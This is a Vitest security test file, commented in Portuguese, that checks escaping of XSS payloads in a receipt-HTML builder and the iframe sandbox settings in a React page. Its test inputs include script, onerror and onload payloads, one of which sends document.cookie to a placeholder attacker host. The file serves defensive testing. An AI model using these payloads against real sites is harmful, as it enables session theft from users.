/**
 * gerar-recibo-xss.test.ts
 * 
 * Testes unitários de segurança importando e executando o módulo de produção:
 * - Sanitização contra Cross-Site Scripting (XSS)
 * - Execução do buildReciboHtml de produção com payloads maliciosos
 * - Neutralização de scripts, event handlers e tags HTML
 * - Validação da política de sandbox do iframe e fallback Blob em Recibos.tsx
 */
import { describe, it, expect } from "vitest";
import { escapeHtml, buildReciboHtml } from "../../../supabase/functions/_shared/gerar-recibo-core.ts";
import * as fs from "fs";
import * as path from "path";

describe("gerar-recibo — Sanitização e Mitigação de XSS com Módulo de Produção", () => {
  it("Importa e executa diretamente escapeHtml de produção contra tags <script>", () => {
    const maliciousInput = "<script>alert('XSS')</script>";
    const sanitized = escapeHtml(maliciousInput);

    expect(sanitized).not.toContain("<script>");
    expect(sanitized).not.toContain("</script>");
    expect(sanitized).toBe("&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;");
  });

  it("Neutraliza event handlers em tags de imagem (onerror)", () => {
    const maliciousInput = '<img src="invalid" onerror="fetch(\'https://attacker.com/steal?c=\' + document.cookie)">';
    const sanitized = escapeHtml(maliciousInput);

    expect(sanitized).not.toContain("<img");
    expect(sanitized).toContain("&lt;img");
    expect(sanitized).toContain("&quot;");
  });

  it("Executa buildReciboHtml de produção e comprova neutralização de XSS no HTML gerado", () => {
    const html = buildReciboHtml({
      valor: 1500,
      pagador: "Empresa <script>alert('XSS_PAGADOR')</script>",
      recebedor: "João <img src=x onerror=alert(1)>",
      descricao: "Serviço com 'payload' \"injetado\"",
      cidade: "São Paulo <svg onload=alert(2)>",
    });

    // Garante que NENHUM elemento executável foi inserido no HTML retornado
    expect(html).not.toContain("<script>alert('XSS_PAGADOR')</script>");
    expect(html).not.toContain("<img src=x onerror=alert(1)>");
    expect(html).not.toContain("<svg onload=alert(2)>");

    // Garante que os caracteres foram escapados de forma segura
    expect(html).toContain("&lt;script&gt;alert(&#039;XSS_PAGADOR&#039;)&lt;/script&gt;");
    expect(html).toContain("&lt;img src=x onerror=alert(1)&gt;");
    expect(html).toContain("&lt;svg onload=alert(2)&gt;");
  });

  it("Garante que Recibos.tsx usa sandbox estrito: allow-modals e allow-same-origin SEM allow-scripts", () => {
    const recibosPath = path.resolve(process.cwd(), "src/pages/Recibos.tsx");
    const code = fs.readFileSync(recibosPath, "utf-8");

    // Verifica que o sandbox está configurado
    expect(code).toContain('sandbox="allow-modals allow-same-origin"');
    // CRUCIAL: allow-scripts NUNCA pode estar presente no sandbox do preview
    expect(code).not.toContain("allow-scripts");
  });

  it("Valida suporte a fallback Blob e escape seguro de entidades em Recibos.tsx", () => {
    const recibosPath = path.resolve(process.cwd(), "src/pages/Recibos.tsx");
    const code = fs.readFileSync(recibosPath, "utf-8");

    expect(code).toContain('new Blob([reciboHtml], { type: "text/html;charset=utf-8" })');
    expect(code).toContain("URL.createObjectURL(blob)");
    expect(code).toContain("URL.revokeObjectURL(blobUrl)");
  });
});